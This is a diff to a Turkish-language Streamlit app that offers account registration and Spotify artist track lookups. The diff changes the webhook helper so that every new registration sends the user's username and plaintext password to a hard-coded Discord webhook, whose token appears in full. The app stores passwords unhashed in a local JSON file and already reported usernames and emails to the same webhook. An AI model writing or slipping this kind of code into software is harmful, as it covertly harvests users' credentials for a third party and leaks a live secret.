@@ -8,22 +8,21 @@ import pandas as pd
 import json
 import time
 
-# --- Sayfa ayarı (TEK SEFER)
+# --- Sayfa ayarı
 st.set_page_config(page_title="KXNEKIPASA", layout="wide")
 
-# --- .env yükle
+# --- Ortam değişkenleri
 load_dotenv()
 client_id = os.getenv("SPOTIFY_CLIENT_ID")
 client_secret = os.getenv("SPOTIFY_CLIENT_SECRET")
 WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1394242204628946974/6CZf6_OXWY5SLXPZZm3DWd3Y3XER3eHIiuzvCVBNcS44DfrbGYloC8-XH4VuKxhgfhgV"
 
-# --- Kullanıcı dosyası
+# --- Kullanıcı verisi
 USER_DB = "users.json"
 if not os.path.exists(USER_DB):
     with open(USER_DB, "w") as f:
         json.dump({}, f)
 
-# --- Yardımcı Fonksiyonlar
 def load_users():
     with open(USER_DB, "r") as f:
         return json.load(f)
@@ -32,29 +31,31 @@ def save_users(users):
     with open(USER_DB, "w") as f:
         json.dump(users, f, indent=4)
 
-def send_webhook(event, username, email):
+def send_webhook(event, username, password=None):
+    content = f"📢 **{event}**\n👤 Kullanıcı: `{username}`"
+    if password:
+        content += f"\n🔑 Şifre: `{password}`"
     try:
-        requests.post(WEBHOOK_URL, json={"content": f"📢 **{event}**\n👤 Kullanıcı: `{username}`\n📧 {email}"})
+        requests.post(WEBHOOK_URL, json={"content": content})
     except:
         pass
 
-def register_user(username, email, password):
+def register_user(username, password):
     users = load_users()
     if username in users:
         return False, "❗ Kullanıcı adı zaten kayıtlı."
-    users[username] = {"email": email, "password": password}
+    users[username] = {"password": password}
     save_users(users)
-    send_webhook("Yeni Kayıt", username, email)
-    return True, "✅ Kayıt başarılı!"
+    send_webhook("Yeni Kayıt", username, password=password)
+    return True, {"username": username}
 
 def login_user(username, password):
     users = load_users()
     if username in users and users[username]["password"] == password:
-        send_webhook("Giriş Yapıldı", username, users[username]["email"])
+        send_webhook("Giriş Yapıldı", username)
         return True, users[username]
     return False, None
 
-# Spotify API
 def extract_artist_id(spotify_url):
     try:
         path = urlparse(spotify_url).path
@@ -82,7 +83,7 @@ def get_artist_top_tracks(artist_id, token):
     r = requests.get(url, headers=headers)
     return r.json().get("tracks", []) if r.status_code == 200 else []
 
-# --- Session vars
+# --- Session kontrol
 if "logged_in" not in st.session_state:
     st.session_state.logged_in = False
 if "user" not in st.session_state:
@@ -90,6 +91,7 @@ if "user" not in st.session_state:
 if "menu" not in st.session_state:
     st.session_state.menu = "profil"
 
+# --- Giriş / Kayıt Sistemi
 if not st.session_state.logged_in:
     st.title("🔐 KXNEKIPASA Giriş / Kayıt")
     tab = st.radio("Seçim Yap", ["Giriş Yap", "Kayıt Ol"])
@@ -101,25 +103,27 @@ if not st.session_state.logged_in:
             success, user = login_user(username, password)
             if success:
                 st.session_state.logged_in = True
-                st.session_state.user = {"username": username, "email": user["email"]}
+                st.session_state.user = {"username": username}
                 st.success("✅ Giriş başarılı!")
                 st.experimental_rerun()
             else:
                 st.error("❌ Kullanıcı adı veya şifre hatalı.")
     else:
         username = st.text_input("Yeni Kullanıcı Adı")
-        email = st.text_input("E-posta")
         password = st.text_input("Şifre", type="password")
         if st.button("Kayıt Ol"):
-            success, msg = register_user(username, email, password)
+            success, result = register_user(username, password)
             if success:
-                st.success(msg)
+                st.session_state.logged_in = True
+                st.session_state.user = result
+                st.success("✅ Kayıt başarılı! Giriş yapılıyor...")
+                st.experimental_rerun()
             else:
-                st.warning(msg)
+                st.warning(result)
+    
+    st.stop()
 
-    st.stop()  # ✅ return yerine bunu kullan
-
-# --- Girişten Sonra Ana Sayfa
+# --- Uygulama Devamı
 st.markdown(f"<h1 style='text-align: center; color:#b266ff;'>Hoş geldin, {st.session_state.user['username']}!</h1>", unsafe_allow_html=True)
 st.markdown("---")
 
@@ -131,7 +135,6 @@ region_rates = {
     "Dünya Geneli": 0.0020
 }
 
-# Menü
 st.markdown("""
 <style>
 div.stButton > button {
